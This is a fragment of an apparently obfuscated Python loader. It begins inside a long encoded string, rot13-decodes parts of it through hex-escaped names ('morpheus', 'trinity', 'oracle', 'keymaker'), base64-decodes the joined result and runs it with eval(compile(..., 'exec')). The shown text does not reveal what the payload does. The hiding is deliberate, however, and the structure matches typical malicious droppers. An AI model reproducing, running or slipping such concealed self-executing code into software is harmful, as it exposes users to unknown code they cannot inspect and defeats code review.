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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))